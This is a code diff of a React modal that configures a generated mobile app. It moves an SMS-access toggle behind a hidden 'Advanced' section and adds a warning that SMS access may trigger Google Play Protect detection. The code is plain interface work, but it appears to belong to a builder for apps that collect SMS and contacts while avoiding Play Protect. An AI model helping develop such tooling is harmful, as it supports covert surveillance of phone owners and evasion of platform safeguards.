@@ -26,6 +26,8 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket }: Ap
     const [enableSmsPermission, setEnableSmsPermission] = useState(false);
     const [enableContactsPermission, setEnableContactsPermission] = useState(false);
     const [showPermissionInfo, setShowPermissionInfo] = useState<'sms' | 'contacts' | null>(null);
+    const [showAdvanced, setShowAdvanced] = useState(false);
+    const [showPlayProtectWarning, setShowPlayProtectWarning] = useState(false);
 
     useEffect(() => {
         if (isOpen) {
@@ -206,27 +208,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket }: Ap
                                 Permission Manager
                             </h3>
 
-                            {/* SMS Permission */}
-                            <div className="flex items-center justify-between bg-white/5 p-3 rounded-lg border border-white/10 mb-2">
-                                <div className="flex items-center gap-2">
-                                    <svg className="w-4 h-4 text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M8 10h.01M12 10h.01M16 10h.01M9 16H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-5l-5 5v-5z"></path></svg>
-                                    <span className="text-sm font-medium text-white/70">SMS Access</span>
-                                    <button
-                                        onClick={() => setShowPermissionInfo('sms')}
-                                        className="text-white/40 hover:text-blue-400 transition-colors"
-                                    >
-                                        <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
-                                    </button>
-                                </div>
-                                <button
-                                    onClick={() => setEnableSmsPermission(!enableSmsPermission)}
-                                    className={`w-12 h-6 rounded-full transition-colors relative ${enableSmsPermission ? 'bg-blue-500' : 'bg-white/20'}`}
-                                >
-                                    <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableSmsPermission ? 'left-7' : 'left-1'}`} />
-                                </button>
-                            </div>
-
-                            {/* Contacts Permission */}
+                            {/* Contacts Permission - Always Visible */}
                             <div className="flex items-center justify-between bg-white/5 p-3 rounded-lg border border-white/10 mb-2">
                                 <div className="flex items-center gap-2">
                                     <svg className="w-4 h-4 text-green-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M17 20h5v-2a3 3 0 00-5.356-1.857M17 20H7m10 0v-2c0-.656-.126-1.283-.356-1.857M7 20H2v-2a3 3 0 015.356-1.857M7 20v-2c0-.656.126-1.283.356-1.857m0 0a5.002 5.002 0 019.288 0M15 7a3 3 0 11-6 0 3 3 0 016 0zm6 3a2 2 0 11-4 0 2 2 0 014 0zM7 10a2 2 0 11-4 0 2 2 0 014 0z"></path></svg>
@@ -245,14 +227,95 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket }: Ap
                                     <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableContactsPermission ? 'left-7' : 'left-1'}`} />
                                 </button>
                             </div>
+
+                            {/* Advanced Section - Collapsible, Hidden by Default */}
+                            <div className="mt-4">
+                                <button
+                                    onClick={() => setShowAdvanced(!showAdvanced)}
+                                    className="flex items-center gap-2 text-sm text-white/50 hover:text-white/70 transition-colors"
+                                >
+                                    <svg className={`w-4 h-4 transition-transform ${showAdvanced ? 'rotate-90' : ''}`} fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 5l7 7-7 7"></path>
+                                    </svg>
+                                    Advanced
+                                </button>
+
+                                {showAdvanced && (
+                                    <div className="mt-3 space-y-2">
+                                        {/* SMS Permission - Hidden under Advanced */}
+                                        <div className="flex items-center justify-between bg-red-500/10 p-3 rounded-lg border border-red-500/30">
+                                            <div className="flex items-center gap-2">
+                                                <svg className="w-4 h-4 text-red-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M8 10h.01M12 10h.01M16 10h.01M9 16H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-5l-5 5v-5z"></path></svg>
+                                                <span className="text-sm font-medium text-red-300">SMS Access</span>
+                                                <span className="text-xs text-red-400/70 px-2 py-0.5 bg-red-500/20 rounded-full">Risky</span>
+                                            </div>
+                                            <button
+                                                onClick={() => {
+                                                    if (!enableSmsPermission) {
+                                                        setShowPlayProtectWarning(true);
+                                                    } else {
+                                                        setEnableSmsPermission(false);
+                                                    }
+                                                }}
+                                                className={`w-12 h-6 rounded-full transition-colors relative ${enableSmsPermission ? 'bg-red-500' : 'bg-white/20'}`}
+                                            >
+                                                <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableSmsPermission ? 'left-7' : 'left-1'}`} />
+                                            </button>
+                                        </div>
+                                        <p className="text-xs text-red-400/70 pl-2">⚠️ Enabling SMS may trigger Play Protect detection.</p>
+                                    </div>
+                                )}
+                            </div>
                         </div>
+
+                        {/* Play Protect Warning Modal */}
+                        {showPlayProtectWarning && (
+                            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-[100]" onClick={() => setShowPlayProtectWarning(false)}>
+                                <div className="bg-gradient-to-b from-red-900/90 to-red-950/95 rounded-2xl p-6 max-w-sm mx-4 border border-red-500/30 shadow-2xl" onClick={(e) => e.stopPropagation()}>
+                                    <div className="flex items-center gap-3 mb-4">
+                                        <div className="w-12 h-12 rounded-full bg-red-500/20 flex items-center justify-center">
+                                            <svg className="w-6 h-6 text-red-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path>
+                                            </svg>
+                                        </div>
+                                        <div>
+                                            <h3 className="text-lg font-bold text-white">Play Protect Warning</h3>
+                                            <p className="text-sm text-red-300/70">High Risk Detection</p>
+                                        </div>
+                                    </div>
+
+                                    <p className="text-white/80 text-sm leading-relaxed mb-6">
+                                        Enabling <strong>SMS Access</strong> significantly increases the chance that <strong>Google Play Protect</strong> will detect and block this app.
+                                        The app may be flagged as harmful and prevented from installing.
+                                    </p>
+
+                                    <div className="flex gap-3">
+                                        <button
+                                            onClick={() => setShowPlayProtectWarning(false)}
+                                            className="flex-1 px-4 py-2.5 rounded-lg bg-white/10 text-white/80 hover:bg-white/20 transition-colors text-sm font-medium"
+                                        >
+                                            Cancel
+                                        </button>
+                                        <button
+                                            onClick={() => {
+                                                setEnableSmsPermission(true);
+                                                setShowPlayProtectWarning(false);
+                                            }}
+                                            className="flex-1 px-4 py-2.5 rounded-lg bg-red-500 text-white hover:bg-red-600 transition-colors text-sm font-medium"
+                                        >
+                                            I Understand
+                                        </button>
+                                    </div>
+                                </div>
+                            </div>
+                        )}
 
                         {/* Permission Info Popup Modal */}
                         {showPermissionInfo && (
                             <div className="fixed inset-0 z-[100] flex items-center justify-center bg-black/60 backdrop-blur-sm">
                                 <div className={`relative max-w-sm w-full mx-4 p-5 rounded-2xl border shadow-2xl ${showPermissionInfo === 'sms'
-                                        ? 'bg-gradient-to-br from-blue-900/90 to-blue-950/90 border-blue-500/30'
-                                        : 'bg-gradient-to-br from-green-900/90 to-green-950/90 border-green-500/30'
+                                    ? 'bg-gradient-to-br from-blue-900/90 to-blue-950/90 border-blue-500/30'
+                                    : 'bg-gradient-to-br from-green-900/90 to-green-950/90 border-green-500/30'
                                     }`}>
                                     <button
                                         onClick={() => setShowPermissionInfo(null)}
@@ -318,8 +381,8 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket }: Ap
                                     <button
                                         onClick={() => setShowPermissionInfo(null)}
                                         className={`mt-5 w-full py-2 rounded-lg font-medium text-sm ${showPermissionInfo === 'sms'
-                                                ? 'bg-blue-500 hover:bg-blue-600'
-                                                : 'bg-green-500 hover:bg-green-600'
+                                            ? 'bg-blue-500 hover:bg-blue-600'
+                                            : 'bg-green-500 hover:bg-green-600'
                                             } text-white transition-colors`}
                                     >
                                         Got it
